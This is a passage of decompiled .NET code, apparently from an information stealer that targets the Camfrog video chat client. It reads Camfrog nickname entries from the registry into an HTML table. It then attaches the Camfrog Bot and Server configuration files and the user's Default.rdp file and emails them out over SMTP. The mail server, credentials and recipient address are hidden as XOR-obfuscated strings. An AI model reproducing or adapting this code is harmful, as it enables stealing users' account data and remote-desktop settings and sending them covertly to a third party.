((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "60", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "61", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "63", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "64", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "66", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "67", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "69", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "70", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "72", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "73", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "75", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "76", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "78", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "79", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "81", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "82", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "84", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "85", (object)"")), (object)"</td>")), (object)"</tr>"), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "87", (object)"")), (object)"</td>")), Operators.AddObject(Operators.AddObject((object)"<td>", ((ServerComputer)Class11.smethod_0()).get_Registry().GetValue("HKEY_USERS\\Sandbox_" + Environment.UserName + "_DefaultBox\\user\\current\\software\\Camfrog\\Client\\CurrentVersion\\ProfileInfo\\Nickname List2\\Item", "88", (object)"")), (object)"</td>")))));
						goto IL_2e17;
						IL_2e17:
						num = 69;
						smtpClient = new SmtpClient();
						goto IL_2e22;
						IL_2e22:
						num = 70;
						mailMessage = new MailMessage();
						goto IL_2e2d;
						IL_2e2d:
						num = 71;
						item = new Attachment("C:\\Program Files\\Camfrog\\Camfrog Bot 3.94\\camfrogbot.conf");
						goto IL_2e3c;
						IL_2e3c:
						num = 72;
						item2 = new Attachment("C:\\Program Files\\Camfrog\\Camfrog Server\\settings.conf");
						goto IL_2e4b;
						IL_2e4b:
						num = 73;
						item3 = new Attachment("C:\\Documents and Settings\\" + Environment.UserName + "\\My Documents\\Default.rdp");
						goto IL_2e6a;
						IL_2e6a:
						num = 74;
						smtpClient.Credentials = new NetworkCredential(string_7, string_8);
						goto IL_2e86;
						IL_2e86:
						num = 75;
						smtpClient.Port = Conversions.ToInteger(string_6);
						goto IL_2e9c;
						IL_2e9c:
						num = 76;
						smtpClient.Host = string_5;
						goto IL_2ead;
						IL_2ead:
						num = 77;
						smtpClient.EnableSsl = true;
						goto IL_2eb9;
						IL_2eb9:
						num = 78;
						mailMessage = new MailMessage();
						goto IL_2ec4;
						IL_2ec4:
						num = 79;
						mailMessage.From = new MailAddress(string_7);
						goto IL_2eda;
						IL_2eda:
						num = 80;
						mailMessage.To.Add(string_9);
						goto IL_2ef0;
						IL_2ef0:
						num = 81;
						mailMessage.Subject = val.get_Text();
						goto IL_2f02;
						IL_2f02:
						num = 82;
						mailMessage.Attachments.Add(item);
						goto IL_2f13;
						IL_2f13:
						num = 83;
						mailMessage.Attachments.Add(item2);
						goto IL_2f24;
						IL_2f24:
						num = 84;
						mailMessage.Attachments.Add(item3);
						goto IL_2f36;
						IL_2f36:
						num = 85;
						mailMessage.Body = val2.get_Text();
						goto IL_2f48;
						IL_2f48:
						num = 86;
						string.Format(Conversions.ToString(1));
						goto IL_2f5e;
						IL_2f5e:
						num = 87;
						mailMessage.IsBodyHtml = true;
						goto IL_2f6a;
						IL_2f6a:
						num = 88;
						smtpClient.Send(mailMessage);
						break;
						IL_03ac:
						num = 46;
						string_9 += Conversions.ToString(Strings.Chr(num6 ^ Strings.Asc(Strings.Mid(array[5], unchecked((int)num5), 1))));
						goto IL_03df;
						IL_03df:
						num = 47;
						num5 = (short)unchecked(num5 + 1);
						goto IL_03ea;
						IL_033c:
						num = 41;
						string_8 += Conversions.ToString(Strings.Chr(num6 ^ Strings.Asc(Strings.Mid(array[4], unchecked((int)num5), 1))));
						goto IL_036f;
						IL_036f:
						num = 42;
						num5 = (short)unchecked(num5 + 1);
						goto IL_037a;
						IL_02cc:
						num = 36;
						string_7 += Conversions.ToString(Strings.Chr(num6 ^ Strings.Asc(Strings.Mid(array[3], unchecked((int)num5), 1))));
						goto IL_02ff;
						IL_02ff:
						num = 37;
						num5 = (short)unchecked(num5 + 1);
						goto IL_030a;
						IL_025c:
						num = 31;
						string_6 += Conversions.ToString(Strings.Chr(num6 ^ Strings.Asc(Strings.Mid(array[2], unchecked((int)num5), 1))));
						goto IL_028f;
						IL_028f:
						num = 32;
						num5 = (short)unchecked(num5 + 1);
						goto IL_029a;
						end_IL_0000_2:
						break;
					}
					num = 89;
					((Form)this).Close();
					break;
				}
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 12544;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
